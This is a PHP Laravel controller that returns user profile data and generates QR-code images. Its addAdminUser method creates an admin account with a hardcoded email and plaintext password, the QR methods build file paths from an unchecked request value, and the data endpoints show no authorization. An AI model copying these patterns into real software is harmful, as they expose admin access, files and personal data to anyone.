<?php

namespace App\Http\Controllers;

use App\Models\GoogleUser;
use App\Models\People;
use Carbon\Carbon;
use SimpleSoftwareIO\QrCode\Facades\QrCode;
use Illuminate\Support\Facades\File;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Str;

class SiteController extends Controller
{

    public function get_user_data(Request $request)
    {
        $data = DB::table('peoples')
            ->select('peoples.*', 'categories.category_name', 'categories.image', 'categories.description')
            ->leftJoin('categories', 'peoples.category_id', '=', 'categories.id')
            ->where('peoples.profile_id', '=', $request->profile_id)
            ->first();
        return response()->json($data);
    }

    public function get_google_user_data(Request $request)
    {
        $data = DB::table('google_users')
            ->select('google_users.*', 'categories.category_name', 'categories.image', 'categories.description')
            ->leftJoin('categories', 'google_users.category_id', '=', 'categories.id')
            ->where('profile_id', $request->profile_id)
            ->first();
        return response()->json($data);
    }

    public function addAdminUser(Request $request)
    {
        $email = 'livaidkddl@gmail.com';
        $password = Hash::make('Aa19921994@@##');

        $data = [
            'name' => 'Live Id',
            'email' => $email,
            'password' => $password,
            'remember_token' => 'apwcR9Q5Ko',
            'email_verified_at' => Carbon::now()
        ];

        DB::table('users')->insert($data); // Use the insert method
        echo 'done';
    }

    public function generateQRCode(Request $request, $profile_id)
    {
        // return $profile_id;
        $return_array = [];
        $people = People::where('email', $profile_id)->first()->toArray();
        $fileName = $profile_id . '.png';
        $filePath = storage_path('QrCode/' . $fileName);
        $headers = ['Content-Type: image/png'];

        if (File::exists($filePath)) {
            // $return_array['downloadLink'] = url('/') . asset('../storage/app/public/QrCode/' . $fileName);
            // $return_array['fileName'] = $fileName;
            return response()->download($filePath);
        } else {
            // The file doesn't exist
            $qrCode = QrCode::size(300)->format('png')->generate($people['page_url']);

            $pathToSave = storage_path('QrCode/');
            if (!File::exists($pathToSave)) {
                File::makeDirectory($pathToSave, 0755, true);
            }

            $filePath = 'storage/QrCode/' . $fileName;
            file_put_contents($pathToSave . '/' . $fileName, $qrCode);


            // $return_array['downloadLink'] = url('/') . asset('../storage/app/public/QrCode/' . $fileName);
            // // $return_array['downloadLink'] = url('/') . asset('../storage/app/public/QrCode/' . $fileName);
            // $return_array['fileName'] = $fileName;
            return response()->download($filePath);
        }
    }

    public function generateGoogleQRCode(Request $request, $profile_id)
    {
        // return $profile_id;
        $return_array = [];

        $pathToSave = storage_path('app/public/GoogleQrCode/');
        if (!File::exists($pathToSave)) {
            File::makeDirectory($pathToSave, 0755, true);
        }

        $people = GoogleUser::where('email', $profile_id)->first()->toArray();
        $fileName = $profile_id . '.png';
        $filePath = storage_path('app/public/GoogleQrCode/' . $fileName);
        $headers = ['Content-Type: image/png'];

        if (File::exists($filePath)) {
            // $return_array['downloadLink'] = url('/') . asset('../storage/app/public/QrCode/' . $fileName);
            // $return_array['fileName'] = $fileName;
            return response()->download($filePath);
        } else {
            // The file doesn't exist
            $qrCode = QrCode::size(300)->format('png')->generate($people['page_url']);


            $filePath = 'storage/app/public/GoogleQrCode/' . $fileName;
            file_put_contents($pathToSave . '/' . $fileName, $qrCode);

            // $return_array['downloadLink'] = url('/') . asset('../storage/app/public/QrCode/' . $fileName);
            // // $return_array['downloadLink'] = url('/') . asset('../storage/app/public/QrCode/' . $fileName);
            // $return_array['fileName'] = $fileName;
            return response()->download($filePath);
        }
    }
}
